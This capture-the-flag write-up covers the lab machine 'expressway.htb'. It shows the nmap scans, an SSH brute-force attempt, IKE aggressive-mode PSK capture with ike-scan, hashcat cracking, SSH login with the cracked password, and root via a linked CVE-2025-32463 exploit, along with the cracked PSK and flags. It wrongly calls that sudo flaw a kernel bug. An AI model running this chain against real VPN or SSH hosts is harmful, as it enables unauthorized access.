**Author:** Karthick Raghul  
**Date:** 2026-01-29  

---
##  Reconnaissance

### TCP Scan

```bash
nmap 10.129.97.139

Result:

PORT      STATE    SERVICE
22/tcp    open     ssh
514/tcp   filtered shell
625/tcp   filtered apple-xsrvr-admin
5280/tcp  filtered xmpp-bosh
9000/tcp  filtered cslistener
10010/tcp filtered rxapi
26214/tcp filtered unknown
```

Only SSH is accessible . Bruteforce was blocked:

```bash
hydra -l admin -P rockyou.txt ssh://10.129.97.139
```

Connection errors indicate protection / rate limiting.
Service Fingerprinting

```bash
nmap -p22 -sV --script ssh2-enum-algos,ssh-hostkey 10.129.97.139

OpenSSH 10.0p2 Debian 8
```

 **UDP Enumeration**

```bash
sudo nmap -sU --top-ports 100 10.129.97.139

500/udp open isakmp

```

**Full scan:**

```
sudo nmap -sU -sV 10.129.97.139

500/udp  open isakmp
4500/udp open|filtered nat-t-ike
```

This indicates ***IPSec / IKE VPN.***

---

## IKE Enumeration

Check IKE version:

```
sudo nmap -sU -p 500 --script ike-version 10.129.97.139

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 14:54 +0530
Nmap scan report for 10.129.97.139
Host is up (0.21s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0

Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
```

>[!WARNING]
After machine reset:
> 
>     New IP: 10.129.238.52
 
**Aggressive Mode Handshake**

```bash
sudo ike-scan -A --pskcrack 10.129.238.52

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52	Aggressive Mode Handshake returned HDR=(CKY-R=32e00c1af2763f19) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
ac2863985cc1259c612bb613f648bcab17eb767311bf5bd49a65c22262ae8ed223a151bff5a941bc8188cc1e2acef09fe72cbff4dc92ab30692565e79688e722a3f7a0596ada9048738249c729257b80a88dc8c715338a9dfcb254e55f4c5262b4f04ae30490bb2316aad9b7b9e047443538f1276a0a684f4112df4df36fe5b0:c4e81b9f2b0eed7ef7840399613e4c186a96351a5e92416bb81419ed0ec48666315cd8a37527f76a8b4579452a089c0056a45d863f08f3edbae7275b0ff0b5947cbdd297828f823e4aed6d8614fe887e7f7303f6ec64b277b37805a5ef5a49c0f555f0f9dab6a4af4846850df6391e39161cddf9ac934d18486439ccfa0d3556:32e00c1af2763f19:de8e7d5874400eee:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:20b439650615f705b8b9ffb47e5ea3b574540ba1:00223cdfcbc245ac753ca58c99cc350390da71e2326150cfec16f627774c37d2:6433bfbfca48a806f24101086b5b324c47db61ca
Ending ike-scan 1.9.6: 1 hosts scanned in 0.478 seconds (2.09 hosts/sec).  1 returned handshake; 0 returned notify
```


So:

> - IKE Aggressive Mode is enabled  
> - Uses Pre-Shared Key  
> - Identity: ike@expressway.htb  

Saved to:

presharedkey.txt

**Crack PSK**

```bash
hashcat -m 5400 presharedkey.txt /usr/share/wordlists/rockyou.txt

```
**Result:**

PSK: freakingrockstarontheroad

**SSH Access**

```bash
ssh ike@10.129.238.52
```

Password:

freakingrockstarontheroad

**User Flag**  : `b218ca5deab50f207afb36946e3f7a89`

---
## Privilege Escalation

**Kernel:**

```bash
uname -a

Linux 6.16.7+deb14
```

*Vulnerable to:*      `CVE-2025-32463 (chwoot)`

Reference exploit:
https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

**Exploit**

Upload exploit script:

```bash
cd /tmp
chmod +x exploit.sh
./exploit.sh
```

 **Root Flag**

cd /root
cat root.txt
`85d13075e1f162d45c7ab1278f924238`

---
### Confestion :

>     The harsh truth is I cannot complete it fully so i references a blog in medium , I fill guilty for it But one day I am sure that I will be capable to complete and provide my own writeups 
